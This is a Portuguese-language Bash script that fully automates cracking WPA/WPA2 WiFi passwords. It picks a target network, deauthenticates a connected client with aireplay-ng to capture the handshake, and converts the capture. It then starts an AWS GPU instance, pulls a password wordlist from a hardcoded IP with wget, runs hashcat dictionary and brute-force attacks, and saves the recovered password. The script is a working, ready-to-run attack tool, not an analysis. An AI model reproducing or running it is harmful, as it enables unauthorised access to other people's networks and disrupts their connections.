#!/bin/bash

#felipesi - 2019

sudo systemctl is-active --quiet network-manager.service || { sudo systemctl restart network-manager.service && sleep 15; }

clear
echo "[+] Listando Interfaces Wireless Disponiveis [+]"

sudo airmon-ng

read -p "Qual Interface Wireless Deseja Utilizar? (ex: wlan0): " interface
clear

echo "[+] Listando Redes WiFi Disponiveis... [+]" && echo

essid="L"

until [ $essid != "L" ];do
    clear
    nmcli device wifi list ifname $interface
    echo && read -p "Digite o SSID Da Rede Alvo (L Para Listar Redes Novamente): " essid
    sudo ifconfig $interface down && sudo ifconfig $interface up
    sleep 5
done

nmcli device wifi list ifname $interface | awk '{print $2}' | grep -v 'IN-USE' | grep "$essid" 1> /dev/null || { echo "Rede Não Encontrada...Saindo" && exit 1; }

clear

echo "[+] Coletando BSSID e Canal Da Rede $essid [+]" && echo
bssid=$(nmcli -f SSID,BSSID,CHAN dev wifi | grep -i $essid | head -1 | awk '{print $2}')
chan=$(nmcli -f SSID,BSSID,CHAN dev wifi | grep -i $essid | head -1 | awk '{print $3}')

echo "[+] Inicializando Interface $interface em Modo Monitor [+]" && echo
sudo airmon-ng start $interface &> /dev/null

monitor=$(sudo airmon-ng | grep 'mon' | awk '{print $2}')

echo "[+] Verificando Clientes Na Rede $essid [+]"
{ sudo airodump-ng --bssid $bssid -c $chan -o csv -w $essid $monitor &> /dev/null; } &
sleep 20
sudo killall airodump-ng

csv=$essid"-01.csv"

if [ "$(cat $csv | grep ':')" == ""  ]; then
    echo && echo "[!] Interface $interface Não Compativel...Saindo [!]"
    sudo airmon-ng stop $monitor &> /dev/null
    sudo rm $csv
    exit 1
fi

client=$(cat $csv | grep ':' | grep -v 'WPA' | sort -k6 | head -1 | cut -d ',' -f1) && sudo rm $csv
echo "[+] Cliente Com Maior Sinal Detectado: $client [+]"

echo "[+] Desautenticando Cliente $client Na Rede $essid [+]" && echo
{ sudo aireplay-ng -0 3 -a $bssid -c $client $monitor &>/dev/null; } &

echo "[+] Capturando Handshake... [+]"
handshake=$essid"-01.cap"


{ sudo airodump-ng $monitor --bssid $bssid -c $chan -o pcap -w $essid &> /dev/null; } &

while true; do
    pyrit -r $handshake analyze &> /dev/null
    if [ "$?" == "0" ]; then
        echo "[+] Handshake Capturado Com Sucesso Em $handshake [+]" && echo
        sudo killall airodump-ng
        break
    fi
    sleep 1
done

HCCAPX=$handshake.hccapx
echo "[+] Convertendo $handshake Para $HCCAPX [+]" && ./cap2hccapx $handshake $HCCAPX &> /dev/null
echo

echo "[-] Removendo $monitor Do Modo Monitor [-]" && echo
sudo airmon-ng stop $monitor &> /dev/null


TYPE="p3.2xlarge"

echo "------------------------------------------------------------------------------" && echo
echo "[+] Criando Instância Do tipo $TYPE [+]" && echo
aws ec2 run-instances --image-id ami-0a3803e4b51dabb6d --count 1 --instance-type $TYPE --key-name ec2-keypair --security-group-ids sg-0cfbdd4128239f002 &> /dev/null


echo "[+] Aguardando Instância Inicializar [+]"
while true; do
    if [ "$IP" == '' ]; then
        IP=$(aws ec2 describe-instances --filters "Name=instance-state-code,Values=16" "Name=instance-type,Values=$TYPE" --query 'Reservations[*].Instances[*].[PublicIpAddress]')
    else
        echo "[+] Instância Inicializada Com Sucesso, IP = $IP [+]" && echo
        break
    fi
done

start=`date +%s`

echo "[+] Aguardando SSH Para Conexão Com a Instância[+]"

while true; do
    nc -vnz -w1 $IP 22 2> /dev/null && echo "[+] SSH Liberado [+]" && echo && break
done


echo "[+] Efetuando Upload De $HCCAPX [+]" && scp -i ec2-keypair.pem -oStrictHostKeyChecking=no $HCCAPX ec2-user@$IP:/home/ec2-user &> /dev/null

echo "[+] Efetuando Upload Do Dicionario De Senhas [+]" && echo && ssh -i ec2-keypair.pem -oStrictHostKeyChecking=no ec2-user@$IP "wget http://3.94.252.106/all.zip &> /dev/null && unzip all.zip && rm all.zip" &> /dev/null

echo "[+] Inicializando GPUs Para Quebra Da Senha...Aguarde [+]" && echo
ssh -i ec2-keypair.pem -oStrictHostKeyChecking=no ec2-user@$IP "hashcat -a0 -m2500 $HCCAPX all.txt -w4 --force &> /dev/null || hashcat -a3 -m2500 $HCCAPX ?d?d?d?d?d?d?d?d -w4 --force &> /dev/null" &> /dev/null

senha=$(ssh -i ec2-keypair.pem -oStrictHostKeyChecking=no ec2-user@$IP "hashcat -m2500 $HCCAPX --show | cut -d ':' -f4,5")

if [ "$senha" != "" ]; then
    echo "[+] Senha Encontrada Com Sucesso -> $senha [+]" | tee $essid'-password.txt'
else
    echo "[-] Senha Não Encontrada [-]"
fi

sudo rm $handshake $HCCAPX

echo

ID=$(aws ec2 describe-instances --filters "Name=instance-state-code,Values=16" "Name=instance-type,Values=$TYPE" --query 'Reservations[*].Instances[*].[InstanceId]')
echo "[-] Terminando Instancia $ID [-]"
aws ec2 terminate-instances --instance-ids $ID &> /dev/null

end=`date +%s`
runtime=$((end-start))

echo
echo "Tempo de utilização da instância: $runtime segundos"

if [ $TYPE == "p3.2xlarge" ]; then
    valor=$(echo | awk "{ print $runtime*0.0035}")
    echo "Total Gasto: R$ $valor"

elif [ $TYPE == "p3.8xlarge" ]; then
    valor=$(echo | awk "{ print $runtime*0.014}")
    echo "Total Gasto: R$ $valor"

elif [ $TYPE == "p3.16xlarge" ]; then
    valor=$(echo | awk "{ print $runtime*0.028}")
    echo "Total Gasto: R$ $valor"

fi
